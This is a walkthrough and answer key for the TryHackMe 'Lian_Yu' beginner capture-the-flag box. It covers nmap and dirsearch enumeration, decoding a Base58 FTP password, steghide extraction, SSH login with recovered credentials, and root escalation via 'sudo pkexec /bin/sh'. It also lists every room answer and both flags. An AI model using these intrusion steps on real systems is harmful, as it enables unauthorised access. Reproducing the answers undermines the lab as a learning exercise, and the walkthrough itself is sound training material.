# <div align="center">[Lian_Yu - TryhackMe walkthrough](https://tryhackme.com/room/lianyu)</div>
<div align="center">A beginner level security challenge</div>
<div align="center">
  <img src="https://github.com/user-attachments/assets/af788293-2527-4656-8dc2-2db94d4e01b7" height="200" width="200"></img>
</div>

## Task 1. Find the Flags
Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.

### Deploy the VM and Start the Enumeration.
```bash
No answer needed
```
### What is the Web Directory you found?
```
2100
```

### what is the file name you found?
```
green_arrow.ticket
```

### what is the FTP Password?
```
!#th3h00d
```

### what is the file name with SSH password?
```
shado
```
### user.txt
```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```
### root.txt
```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

---

## Initial Reconnaissance

I kicked things off with a full service and version scan to map the exposed attack surface. Instead of running a basic scan, I enabled default scripts along with version detection to get maximum visibility in one go.

```
nmap -sV -sC 10.49.161.195
```

The scan quickly revealed a small but interesting set of open services:

* FTP running on port 21
* SSH exposed on port 22
* A web server on port 80
* RPC service on port 111

The presence of FTP alongside a web service immediately stood out. In many cases, misconfigured FTP services become an easy entry point, so I kept that in mind as I moved forward.

---

## Web Enumeration

With the web server exposed, I shifted focus to port 80 and opened the target in the browser.

<img width="1891" height="957" alt="image" src="https://github.com/user-attachments/assets/a483707b-ac54-47f3-a7f9-8b6c578a6ead" />

At first glance, nothing useful was visible on the surface. No obvious inputs, no leaks, nothing actionable. That usually means one thing. Time to dig deeper.

---

## Directory Bruteforcing

I started enumerating hidden paths using `dirsearch` with a well-known wordlist.

```
dirsearch -u http://10.49.161.195 -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

Target: http://10.49.161.195/

[20:13:50] Starting: 
[20:14:30] 301 -  236B  - /island  ->  http://10.49.161.195/island/
[20:18:22] 403 -  199B  - /server-status

Task Completed
```

The scan returned an interesting directory:

```
/island
```

That gave me a new attack vector to explore.

---

## Hidden Clues in Source Code

After navigating to `/island`, I checked the page source instead of just relying on what was rendered.

<img width="1920" height="406" alt="image" src="https://github.com/user-attachments/assets/ea6d9390-00e4-4cda-838c-a195bfe9d486" />

Inside the source, I found a hidden keyword:

```
vigilante
```

At this stage, it looked like a potential username. It could be tied to FTP or SSH, but without a password, it was not immediately usable. Still, it was a valuable piece of intel, so I noted it down and continued enumerating.

---

## Deeper Enumeration

I pushed further into the `/island` directory with another round of directory brute forcing.

```
dirsearch -u http://10.49.161.195/island/ -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

Target: http://10.49.161.195/

[20:25:42] Starting: island/
[20:26:01] 301 -  241B  - /island/2100  ->  http://10.49.161.195/island/2100/

Task Completed
```

This revealed another hidden path:

```
/island/2100
```

Opening it in the browser did not immediately reveal anything useful. 

<img width="1640" height="565" alt="image" src="https://github.com/user-attachments/assets/dde7c989-0fd3-4bdf-9baa-5bcdaeedd7b1" />

While inspecting the source code, I noticed a reference pointing toward a file with a `.ticket` extension. That immediately suggested there might be something intentionally hidden. I followed the same enumeration approach and continued digging deeper to locate it.

```
dirsearch -u http://10.49.161.195/island/2100 -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .ticket


Target: http://10.49.161.195/

[20:25:42] Starting: island/2100
[20:26:01] 301 -  241B  - /green_arrow.ticket  ->  http://10.49.161.195/island/2100/green_arrow.ticket

Task Completed
```

This time, I discovered a file:

```
/island/2100/green_arrow.ticket
```

---

## Extracting Credentials

Opening the file revealed an encoded string.

<img width="455" height="124" alt="image" src="https://github.com/user-attachments/assets/30091d5a-ec70-4d66-a0f1-d4f16ff20d3d" />

```
RTy8yhBQdscX
```

The format suggested it was not random. After analyzing the pattern, I identified it as Base58 encoding. I decoded it to retrieve the original value.

<img width="1920" height="935" alt="image" src="https://github.com/user-attachments/assets/ac068391-589a-4e90-b50b-5517b49adad7" />

The decoded output gave me a potential password:

```
!#th3h00d
```

At this point, I had a likely username and password combination gathered through enumeration. The next step was to validate where these credentials could be used.

## Gaining Access to FTP

With a potential username and password in hand, I moved to validate them against the FTP service.

```
ftp 10.49.161.195
```

```
Name: vigilante  
Password: !#th3h00d
```

The login was successful, confirming that the credentials were valid for FTP access.

---

### Exploring FTP Storage

Once inside, I listed the available files on the server.

```
ls
```

The directory contained three image files:

* `Leave_me_alone.png`
* `Queen's_Gambit.png`
* `aa.jpg`

<img width="774" height="402" alt="image" src="https://github.com/user-attachments/assets/fa5d30d4-23f8-4ce8-baf7-2562fad95781" />

I downloaded all of them locally for further analysis.

```
get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
```

---

### Enumerating User Directories

Before moving ahead, I checked the `/home` directory to understand the system users.

```
cd /home
ls
```

This revealed two users:

* `slade`
* `vigilante`

That aligned well with the username I had already discovered earlier.

---

### Analyzing Downloaded Files

I started inspecting the downloaded images. One file immediately stood out.

The file `Leave_me_alone.png` refused to open, and even metadata analysis showed an issue.

<img width="753" height="730" alt="image" src="https://github.com/user-attachments/assets/af6e431d-04d9-4014-ba41-723aba303fca" />

The error suggested that the file format was corrupted or manipulated. To verify this, I opened the file in a hex editor.

<img width="1362" height="420" alt="image" src="https://github.com/user-attachments/assets/8edcf30b-d49e-4a43-871e-310cf8fcb42c" />

At first, nothing obvious stood out. But after comparing the header with a valid PNG signature, it became clear that the file header was incorrect.

<img width="824" height="512" alt="image" src="https://github.com/user-attachments/assets/d9f7fb6e-f828-4e06-a221-4905e20ecb56" />

I corrected the header manually.

<img width="1367" height="342" alt="image" src="https://github.com/user-attachments/assets/cb72c22f-9e4c-494c-88e9-f92ee2ae9663" />

After fixing it, the image opened successfully.

<img width="845" height="475" alt="Leave_me_alone" src="https://github.com/user-attachments/assets/a50b068c-0b6f-4b5a-a3e0-5742a1219a66" />

Inside the image, I found a password:

```
password
```

---

### Extracting Hidden Data

Next, I moved to the other image file to check for hidden content. I used `steghide` to extract any embedded data.

```
steghide extract -sf aa.jpg
```

After providing the passphrase, it extracted a zip file:

```
ss.zip
```

Unzipping it revealed two files.

```
cat passwd.txt
cat shado
```

The contents were:

**passwd.txt**

```
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

**shado**

```
M3tahuman
```

The second file looked like a password, and given the earlier user enumeration, it was likely tied to one of the system users.

---

## User Access via SSH

Using the discovered credentials, I attempted SSH access.

```
ssh slade@10.49.161.195
```

```
Username: slade  
Password: M3tahuman
```

The login was successful, confirming valid user access on the system.

---

## User Flag

Once inside, I listed the directory contents. The user flag was present in the home directory.

<img width="717" height="624" alt="image" src="https://github.com/user-attachments/assets/c367f4c8-afc5-47a5-9d7e-21e02ce6dd87" />

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

That marked successful user-level access on the machine.

## Privilege Escalation

With user access established, I shifted focus toward privilege escalation. The first step was to check which commands I could run with elevated privileges.

```id="lq7n2p"
sudo -l
```

<img width="1064" height="177" alt="image" src="https://github.com/user-attachments/assets/db28c1b3-b432-4641-9ad8-52c88913762b" />

The output showed that `/usr/bin/pkexec` could be executed with root privileges. Whenever I find a binary listed under sudo, my next move is to verify if it can be abused for escalation.

For that, I referred to GTFOBins, a well-known resource that documents how common Linux binaries can be leveraged to bypass restrictions and escalate privileges in misconfigured environments.

I looked up `pkexec` on [GTFOBins](https://gtfobins.org) and found a working method to spawn a root shell.

<img width="959" height="518" alt="image" src="https://github.com/user-attachments/assets/424921d6-909c-4665-ac35-d5719a378723" />

The technique was straightforward:

```
sudo pkexec /bin/sh
```

This works because when executed via sudo, `pkexec` does not drop elevated privileges and can spawn a shell as root. ([GTFOBins][2])

<img width="604" height="233" alt="image" src="https://github.com/user-attachments/assets/06f62b4d-7a25-4538-9729-184dedfa204c" />

This gave me a root shell.

---

## Root Flag

With root access confirmed, I navigated to retrieve the final flag.

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

<img width="955" height="562" alt="image" src="https://github.com/user-attachments/assets/39784241-5f0e-42fd-9e55-5fce5aeb3042" />

> Thanks for reading.

<img width="860" height="384" alt="image" src="https://github.com/user-attachments/assets/9805ec51-6d15-4976-aec5-a3d6c490a3bb" />"
